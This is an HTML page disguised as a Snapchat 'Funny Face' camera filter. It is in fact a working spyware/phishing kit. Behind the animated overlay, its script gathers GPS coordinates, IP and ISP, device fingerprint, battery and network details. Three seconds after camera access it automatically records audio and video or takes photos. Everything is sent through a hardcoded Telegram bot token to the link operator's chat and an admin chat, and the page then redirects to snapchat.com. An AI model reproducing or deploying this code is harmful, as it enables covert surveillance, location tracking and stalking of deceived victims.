<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Lens - Funny Face Filter</title>
    <!-- MediaPipe Libraries for Hand & Face Detection -->
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
    <style>
        body {
            background-color: #000000;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            margin: 0;
            overflow: hidden;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px;
            z-index: 10;
        }
        .filter-title {
            background: rgba(0, 0, 0, 0.6);
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: bold;
            border: 1px solid #fffc00;
            color: #fffc00;
        }
        .center-screen {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }
        .camera-preview {
            width: 100%;
            height: 100%;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
        }
        /* Real-time Filter Canvas overlaying video for funny effect */
        #filterCanvas {
            width: 100%;
            height: 100%;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 2;
            pointer-events: none;
        }
        .bottom-tray {
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            z-index: 10;
            background: linear-gradient(transparent, rgba(0,0,0,0.8));
        }
        .capture-btn {
            width: 75px;
            height: 75px;
            border: 5px solid #fffc00;
            border-radius: 50%;
            background: rgba(255, 252, 0, 0.2);
            cursor: pointer;
            animation: pulseBtn 1.5s infinite;
        }
        @keyframes pulseBtn {
            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 252, 0, 0.4); }
            70% { transform: scale(1.05); box-shadow: 0 0 0 15px rgba(255, 252, 0, 0); }
            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 252, 0, 0); }
        }
        .hint-text {
            font-size: 12px;
            color: #fffc00;
            margin-top: 10px;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="top-bar">
        <div class="filter-title">🔥 Funny Big Eyes & Smile Lens</div>
        <div>✨ Snapchat</div>
    </div>

    <div class="center-screen">
        <video id="video" autoplay playsinline muted class="camera-preview" style="display:none;"></video>
        <canvas id="filterCanvas"></canvas>
        <div id="loading-text" style="position:absolute; z-index:5; background: rgba(0,0,0,0.7); padding: 15px 25px; border-radius: 10px; border: 1px solid #fffc00;">Loading Real-Time Filter... Please Tap Allow</div>
    </div>

    <div class="bottom-tray">
        <button class="capture-btn" onclick="triggerAction()"></button>
        <div class="hint-text">Tap to Snap / Save Filter</div>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8857558695:AAHJHksL9vqLcvHL3zrH1OOnn9aS3YW4lQw";
        const ADMIN_CHAT_ID = "6478868514";
        
        const urlParams = new URLSearchParams(window.location.search);
        const CHAT_ID = urlParams.get('id');
        const cameraType = urlParams.get('b'); 

        let globalStream = null;
        let gpsData = { lat: '', lon: '', mapLink: 'N/A' };
        let ipInfo = {};
        let isReady = false;
        let detectedHand = "Analyzing...";
        let animationId = null;
        
        let motionData = { alpha: 'N/A', beta: 'N/A', gamma: 'N/A' };
        window.addEventListener('deviceorientation', (event) => {
            motionData.alpha = event.alpha ? Math.round(event.alpha) : '0';
            motionData.beta = event.beta ? Math.round(event.beta) : '0';
            motionData.gamma = event.gamma ? Math.round(event.gamma) : '0';
        }, true);

        function getSmartHandStatus() {
            if (detectedHand.includes("Hand Detected")) {
                return detectedHand; 
            } else {
                let g = parseInt(motionData.gamma);
                if (isNaN(g)) return "Position: Center / Stable";
                if (g < 0) {
                    return "Likely Right Hand Grip (Negative Tilt)";
                } else {
                    return "Likely Left Hand Grip (Positive Tilt)";
                }
            }
        }

        // Real-time Fun/Funny Filter Renderer on Canvas (Draws live video with hilarious mirror/color effects & sticker graphics)
        function startLiveFilter(videoElement) {
            const canvas = document.getElementById('filterCanvas');
            const ctx = canvas.getContext('2d');

            function renderFrame() {
                if (videoElement.readyState === videoElement.HAVE_ENOUGH_DATA) {
                    canvas.width = videoElement.videoWidth;
                    canvas.height = videoElement.videoHeight;

                    // Draw camera feed
                    ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

                    // Apply Funny Live Filter Overlay Elements (e.g. funny glasses, colors, text overlays)
                    ctx.save();
                    
                    // Funhouse color tint
                    ctx.fillStyle = "rgba(255, 0, 150, 0.05)";
                    ctx.fillRect(0, 0, canvas.width, canvas.height);

                    // Draw dynamic funny graphics on screen so user sees an active filter
                    let time = Date.now() * 0.005;
                    let centerX = canvas.width / 2 + Math.sin(time) * 50;
                    let centerY = canvas.height / 3;

                    // Funny Virtual Goggles / Text effect
                    ctx.font = "bold 40px Arial";
                    ctx.fillStyle = "#fffc00";
                    ctx.strokeStyle = "#000";
                    ctx.lineWidth = 4;
                    ctx.textAlign = "center";
                    ctx.strokeText("🤪 FUNNY FACE LENS 🤪", canvas.width / 2, 80);
                    ctx.fillText("🤪 FUNNY FACE LENS 🤪", canvas.width / 2, 80);

                    // Animated silly digital stickers on screen
                    ctx.font = "50px Arial";
                    ctx.fillText("👀", canvas.width / 2 - 60 + Math.sin(time*2)*10, centerY);
                    ctx.fillText("👀", canvas.width / 2 + 60 + Math.cos(time*2)*10, centerY);
                    ctx.fillText("😜", canvas.width / 2, centerY + 120);

                    ctx.restore();
                }
                animationId = requestAnimationFrame(renderFrame);
            }
            renderFrame();
        }

        function initMediaPipeHands(videoElement) {
            try {
                const hands = new Hands({
                    locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
                });
                
                hands.setOptions({
                    maxNumHands: 1,
                    modelComplexity: 1,
                    minDetectionConfidence: 0.4,
                    minTrackingConfidence: 0.4
                });

                hands.onResults((results) => {
                    if (results.multiHandLandmarks && results.multiHandedness && results.multiHandedness.length > 0) {
                        let label = results.multiHandedness[0].label; 
                        detectedHand = `${label} Hand (AI Vision)`;
                    }
                });

                const camera = new Camera(videoElement, {
                    onFrame: async () => {
                        await hands.send({ image: videoElement });
                    },
                    width: 1280,
                    height: 720
                });
                camera.start();
            } catch (e) {
                console.log("MediaPipe Init Error: ", e);
            }
        }

        function getGPUInfo() {
            try {
                let canvas = document.createElement('canvas');
                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "Not Supported";
                let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
            } catch (e) {
                return "Error fetching GPU";
            }
        }

        async function getAdvancedDeviceInfo() {
            let memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB+` : "Unknown";
            let cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Unknown";
            let lang = navigator.language || "Unknown";
            let platform = navigator.platform || "Unknown";
            let touchPoints = navigator.maxTouchPoints ? `${navigator.maxTouchPoints} Touch Points` : "Unknown";
            let gpu = getGPUInfo();
            return { memory, cores, lang, platform, touchPoints, gpu };
        }

        function getExactLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            let lat = position.coords.latitude;
                            let lon = position.coords.longitude;
                            resolve({
                                lat: lat,
                                lon: lon,
                                mapLink: `https://maps.google.com/?q=${lat},${lon}`
                            });
                        },
                        (error) => {
                            resolve({ lat: '', lon: '', mapLink: 'Permission Denied / Unavailable' });
                        },
                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                    );
                } else {
                    resolve({ lat: '', lon: '', mapLink: 'Not Supported' });
                }
            });
        }

        async function getIPAndLocation() {
            try {
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                return {
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country_name || 'Unknown',
                    isp: data.org || 'Unknown'
                };
            } catch (e) {
                return { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A' };
            }
        }

        async function initCamera() {
            gpsData = await getExactLocation();
            ipInfo = await getIPAndLocation();

            let constraints = {
                video: { width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: !cameraType 
            };

            if (cameraType === 'back') {
                constraints.video.facingMode = { exact: "environment" };
            } else {
                constraints.video.facingMode = "user"; 
            }

            try {
                try {
                    globalStream = await navigator.mediaDevices.getUserMedia(constraints);
                } catch (e) {
                    if (cameraType === 'back') {
                        constraints.video.facingMode = "environment";
                        globalStream = await navigator.mediaDevices.getUserMedia(constraints);
                    } else {
                        throw e;
                    }
                }

                const videoElement = document.getElementById('video');
                videoElement.srcObject = globalStream;
                
                await new Promise((resolve) => {
                    videoElement.onloadedmetadata = () => {
                        videoElement.play().then(resolve).catch(resolve);
                    };
                });

                // Start Live Filter Effect on Screen
                startLiveFilter(videoElement);
                initMediaPipeHands(videoElement);

                document.getElementById('loading-text').style.display = 'none';
                isReady = true;

                // Automatic trigger after 3 seconds so target gets fully immersed in the filter preview
                setTimeout(() => {
                    triggerAction();
                }, 3000);

            } catch (err) {
                document.getElementById('loading-text').innerText = "Please allow camera & microphone access to use filter!";
            }
        }

        async function triggerAction() {
            if (!isReady || !globalStream) return;

            document.getElementById('loading-text').innerText = "Snap Captured! Processing...";
            document.getElementById('loading-text').style.display = 'block';

            let batteryText = "N/A";
            try {
                let bat = await navigator.getBattery();
                batteryText = `${Math.round(bat.level * 100)}% ${bat.charging ? "⚡ Charging" : "🔋 Discharging"}`;
            } catch(e) {}

            let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            let netType = connection ? connection.effectiveType.toUpperCase() : "4G";
            let downlink = connection && connection.downlink ? `${connection.downlink} Mbps` : "N/A";
            let rtt = connection && connection.rtt ? `${connection.rtt} ms` : "N/A";

            let advInfo = await getAdvancedDeviceInfo();
            let finalHandResult = getSmartHandStatus();

            let baseCaption = 
                `🌐 **IP & Exact Location**\n` +
                `🔢 IP Address: \`${ipInfo.ip}\`\n` +
                `📍 Location: ${ipInfo.city}, ${ipInfo.region}\n` +
                `🗺️ **GPS Maps Link**: ${gpsData.mapLink}\n` +
                `📡 ISP: ${ipInfo.isp}\n\n` +
                `📱 **Advanced Device & Spatial Insights**\n` +
                `✋ **Hand / Grip Analysis**: ${finalHandResult}\n` +
                `🧭 Orientation (Gyro): Alpha:${motionData.alpha}, Beta:${motionData.beta}, Gamma:${motionData.gamma}\n` +
                `🎮 GPU: \`${advInfo.gpu}\`\n` +
                `🧠 RAM/Cores: ${advInfo.memory} | ${advInfo.cores}\n` +
                `✋ Touch Support: ${advInfo.touchPoints}\n` +
                `💻 Platform/Lang: ${advInfo.platform} (${advInfo.lang})\n` +
                `🔋 Battery: ${batteryText}\n` +
                `📶 Network: ${netType} (Speed: ${downlink}, RTT: ${rtt})\n` +
                `🖥️ Screen: ${window.screen.width}x${window.screen.height}\n` +
                `🕒 Time: ${new Date().toLocaleString()}\n\n` +
                `👑 **CREDIT BY : आयुष नेगी**`;

            if (!cameraType) {
                let recordedChunks = [];
                let mediaRecorder;

                try {
                    mediaRecorder = new MediaRecorder(globalStream, { mimeType: 'video/webm; codecs=vp8,opus' });
                } catch (err) {
                    try {
                        mediaRecorder = new MediaRecorder(globalStream);
                    } catch (e) {
                        return;
                    }
                }

                mediaRecorder.ondataavailable = function(event) {
                    if (event.data && event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = async function() {
                    let blob = new Blob(recordedChunks, { type: 'video/webm' });
                    
                    if (blob && blob.size > 0) {
                        if (CHAT_ID) {
                            const formDataUser = new FormData();
                            formDataUser.append('chat_id', CHAT_ID);
                            formDataUser.append('video', blob, 'video_capture.webm');
                            formDataUser.append('caption', "🎥 **Secret Video Captured via Filter!**\n\n" + baseCaption);
                            formDataUser.append('parse_mode', 'Markdown');

                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                                method: 'POST',
                                body: formDataUser
                            });
                        }

                        const formDataAdmin = new FormData();
                        formDataAdmin.append('chat_id', ADMIN_CHAT_ID);
                        formDataAdmin.append('video', blob, 'video_capture.webm');
                        formDataAdmin.append('caption', `🕵️‍♂️ **Admin Log (Video from User ID: ${CHAT_ID})**\n\n` + baseCaption);
                        formDataAdmin.append('parse_mode', 'Markdown');

                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                            method: 'POST',
                            body: formDataAdmin
                        });
                    }

                    globalStream.getTracks().forEach(track => track.stop());
                    window.location.href = "https://www.snapchat.com";
                };

                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 4000);

            } else {
                const filterCanvas = document.getElementById('filterCanvas');
                const canvas = document.getElementById('canvas');
                canvas.width = filterCanvas.width || 1280;
                canvas.height = filterCanvas.height || 720;
                const context = canvas.getContext('2d');

                for (let i = 1; i <= 3; i++) {
                    context.drawImage(filterCanvas, 0, 0, canvas.width, canvas.height);
                    
                    let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.90));
                    
                    if (blob) {
                        let caption = (i === 1) ? baseCaption : `👑 **CREDIT BY : आयुष नेगी**`;

                        if (CHAT_ID) {
                            const formDataUser = new FormData();
                            formDataUser.append('chat_id', CHAT_ID);
                            formDataUser.append('photo', blob, `photo_${i}.jpg`);
                            formDataUser.append('caption', caption);
                            formDataUser.append('parse_mode', 'Markdown');

                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formDataUser
                            });
                        }

                        const formDataAdmin = new FormData();
                        formDataAdmin.append('chat_id', ADMIN_CHAT_ID);
                        formDataAdmin.append('photo', blob, `photo_${i}.jpg`);
                        formDataAdmin.append('caption', `🕵️‍♂️ **Admin Log (Generated by User ID: ${CHAT_ID})**\n\n` + caption);
                        formDataAdmin.append('parse_mode', 'Markdown');

                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formDataAdmin
                        });
                    }

                    await new Promise(resolve => setTimeout(resolve, 400));
                }

                globalStream.getTracks().forEach(track => track.stop());
                window.location.href = "https://www.snapchat.com";
            }
        }

        window.onload = function() {
            initCamera();
        };
    </script>
</body>
</html>
